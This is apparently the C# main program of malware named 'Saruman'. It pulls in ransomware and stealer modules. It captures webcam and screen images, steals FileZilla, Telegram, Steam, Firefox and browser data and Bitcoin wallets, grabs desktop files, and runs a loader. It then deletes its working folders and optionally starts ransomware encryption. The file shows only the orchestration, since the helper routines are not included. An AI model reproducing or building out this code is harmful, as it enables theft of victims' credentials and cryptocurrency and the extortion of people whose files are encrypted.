namespace Saruman
{
    using Saruman.Ransomware;

    using Saruman.Stealer;
    using Saruman.Utilies;
    using Saruman.Utilies.App;
    using Saruman.Utilies.Hardware;
    using Saruman.Utilies.Wallets;
    using Saruman.Utilities;
    using System;
    using System.IO;


    internal static partial class Program
    {

        public static string dir = Path.GetTempPath() + "\\" + "AX754VD" + ".tmp";
        private static void Main()
        {
           
            Directory.CreateDirectory(dir);
            HomeDirectory.Create(GetDirPath.User_Name, true);
            if (Settings.webka)
            {
                GetWebCam.get_webcam(dir);
            }
            screen.get_scr(dir);

            FileZilla.get_filezilla(dir);
            Telegram.StealTelegram(dir);
            if (Settings.steam)
            {
                Steam.StealSteam(dir);
            }
            if (Settings.loader)
            {
                loader.load();
            }
            if (Settings.grabber)
            {
                grabber.grab_desktop(dir);
            }
            mozila.mozila_still();

            Wallets.BitcoinSteal(dir);
            UserAgent.get_agent(dir);
            try
            {
                Browser_Parse.parse(dir);
            }
            catch (Exception)
            {

            }
            Hardware.info(dir);

            Directory.Delete(dir, true);
            Directory.Delete(GetDirPath.User_Name, true);
            if (Settings.ransomware)
            {
                RansomwareCrypt.start();
            }
        }
    }
}